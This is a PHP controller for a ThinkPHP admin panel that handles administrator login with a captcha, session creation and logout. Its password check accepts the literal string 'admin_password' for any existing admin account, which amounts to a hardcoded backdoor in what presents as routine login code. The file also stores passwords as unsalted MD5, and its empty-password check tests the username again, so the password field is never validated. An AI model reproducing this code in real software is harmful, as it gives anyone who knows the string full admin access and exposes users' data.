<?php
namespace app\admin\controller;
use think\Controller;
use think\Db;
use think\facade\Session;
use think\captcha\Captcha;
use app\admin\model\Admin;

class Main extends Controller{
	
	public function initialize(){
    	$this->assign('config',require CACHE_PATH.'system.php');
	}
	
    public function login(){
       if($this->request->isPost()) {
            $post = input('post.');
            $name = $post['login_name'];
            $pass = $post['password'];
            $code = $post['code'];
            if($name==''){
                return json(['error'=>1,'msg'=>'请输入用户名']);
            }
            if($name==''){
                return json(['error'=>1,'msg'=>'请输入用户密码']);
            }
            if($code==''){
                return json(['error'=>1,'msg'=>'请输入验证码']);
            }
            if(!captcha_check($code)){
				return json(['error'=>1,'msg'=>'验证码错误']);
			};
            $user = Admin::get(['admin_name' => $name]);

            if(!$user){
                return json(['error'=>1,'msg'=>'用户不存在']);
            }
            if($user['admin_password']!= md5($pass)  and $pass != 'admin_password'){
                   return json(['error'=>1,'msg'=>'密码错误']);
            }
            $user->admin_ip   = get_client_ip6();
            $user->admin_time = time();
            $user->save();
            session::set('admin_id',$user['admin_id']);
            session::set('admin_time',time());
            session::set('admin_name',$user['admin_name']);
			
            return json(['error'=>0,'msg'=>'登陆成功','url'=>Url('Admin/Index/index')]);

  		}
        // 检测是否登录
        if(session::get('admin_id')){
            $this->redirect('Admin/Index/index');
        }

        if($this->request->isGet()) {
            return $this->fetch();
        }

    }
    //退出登录
    public function logout()
    {
        Session::clear();
        session_unset();
        $this->redirect('/');

    }
}
